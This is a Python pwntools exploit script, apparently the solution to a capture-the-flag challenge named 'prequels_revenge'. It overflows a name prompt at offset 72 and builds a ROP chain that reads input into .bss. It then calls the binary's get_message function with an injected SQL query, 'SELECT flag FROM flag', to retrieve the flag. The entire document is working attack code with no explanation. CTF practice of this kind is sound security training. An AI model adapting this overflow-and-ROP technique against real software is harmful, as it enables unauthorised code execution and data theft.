from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        context.terminal = ["konsole", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("localhost", 10990)
    else:
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    p = process(exe)
    p.sendlineafter(b"name: ", payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4).decode())
    info("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


exe = "./out/prequels_revenge"
elf = context.binary = ELF(exe)
context.log_level = "info"
context.delete_corefiles = True

gdbscript = """
b get_message
continue
""".format(
    **locals()
)

io = start()
#ip_offset = find_ip(cyclic(100))
ip_offset = 72

rop = ROP(elf)
version_query = next(elf.search(b"102"))
info("version_query: %r", version_query)
info("%#x get_message", elf.symbols.get("get_message"))
rop.read(0, elf.bss(), 0x100)
rop.call(elf.symbols.get("get_message"), [elf.bss(), version_query])

info("rop chain: %r", rop.chain())

io.sendlineafter(b"name: ", flat({ip_offset: rop.chain()}))
io.sendline(b"SELECT flag FROM flag LIMIT ?;")

io.interactive()
